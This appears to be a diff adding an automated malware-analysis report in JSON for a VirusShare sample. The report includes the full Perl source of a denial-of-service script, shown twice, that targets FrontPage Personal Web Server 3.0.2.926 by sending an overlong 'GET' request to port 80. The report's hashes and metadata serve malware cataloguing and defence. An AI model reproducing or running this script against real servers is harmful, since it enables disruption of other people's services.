@@ -1,0 +1,62 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {},
+        "macro": "#!/usr/bin/perl\n########################################################\n#\n# FrontPage-PWS32/3.0.2.926 DoS By Narr0w.\n\t\t#\n#\n\t\t\t\t\t\t\t#\n# Greetz to: STAR-W0RMS & Legion2000 Group\n\t\t#\n# Big FUCK to the channel #hacking @EFNET.........\t#\n#########################################################\nuse IO::Socket;\nif(@ARGV < 1) { die \"\\nUsage: $0 <host>\\n\\n\"; }\n$len=length($ARGV[0]);\nif($len >= 64) { die \"\\nError: Host Length Too Long ($len)...\\n\"; }\n$host = @ARGV[0];\nprint \"Connecting to $host...\\t\";\n$socket = IO::Socket::INET->new(PeerAddr => $host,PeerPort => 80,Proto => \"TCP\") || die \"[FAILED]\\n\";\nprint \"[  OK  ]\\n\";\nprint \"Sending x's...\\t\\t\";\nprint $socket \"GET /\" . \"x\"x167 . \" HTTP/1.0\\n\\n\";\nprint \"\\t[  OK  ]\\n\";\nprint \"Checking...\\t\\t\\t\";\nsleep(5);\nwhile(<$socket>) {\nchop;\nif(/404 Not Found/) {\n\tprint \"[FAILED]\\n\";\n\tprint \"\\nThis DoS does not work on this server ($host) ...\\n\";\n\tclose $socket;\n\texit(0);\n}\nelse\n{\n\tprint \"[  OK  ]\\n\";\n\tclose $socket;\n }\n}\nexit;"
+    },
+    "filename": "VirusShare_10d6dc54a345a01710e80614a5c346dc",
+    "filesize": 988,
+    "filetype": "Perl script text executable",
+    "hashes": {
+        "md5": "10d6dc54a345a01710e80614a5c346dc",
+        "sha1": "a866eaee58bb505dc41d47b8457156b51cf6ec03",
+        "sha256": "837096ace8ebe73fb95659e874e2c27b2641b15befda495d7e6f46f8bc1f8221"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "#!/usr/bin/perl",
+            "########################################################",
+            "# FrontPage-PWS32/3.0.2.926 DoS By Narr0w.",
+            "\t\t\t\t\t\t\t#",
+            "# Greetz to: STAR-W0RMS & Legion2000 Group",
+            "# Big FUCK to the channel #hacking @EFNET.........\t#",
+            "#########################################################",
+            "use IO::Socket;",
+            "if(@ARGV < 1) { die \"\\nUsage: $0 <host>\\n\\n\"; }",
+            "$len=length($ARGV[0]);",
+            "if($len >= 64) { die \"\\nError: Host Length Too Long ($len)...\\n\"; }",
+            "$host = @ARGV[0];",
+            "print \"Connecting to $host...\\t\";",
+            "$socket = IO::Socket::INET->new(PeerAddr => $host,PeerPort => 80,Proto => \"TCP\") || die \"[FAILED]\\n\";",
+            "print \"[  OK  ]\\n\";",
+            "print \"Sending x's...\\t\\t\";",
+            "print $socket \"GET /\" . \"x\"x167 . \" HTTP/1.0\\n\\n\";",
+            "print \"\\t[  OK  ]\\n\";",
+            "print \"Checking...\\t\\t\\t\";",
+            "sleep(5);",
+            "while(<$socket>) {",
+            "chop;",
+            "if(/404 Not Found/) {",
+            "\tprint \"[FAILED]\\n\";",
+            "\tprint \"\\nThis DoS does not work on this server ($host) ...\\n\";",
+            "\tclose $socket;",
+            "\texit(0);",
+            "else",
+            "\tprint \"[  OK  ]\\n\";",
+            "\tclose $socket;",
+            "exit;"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.262976",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
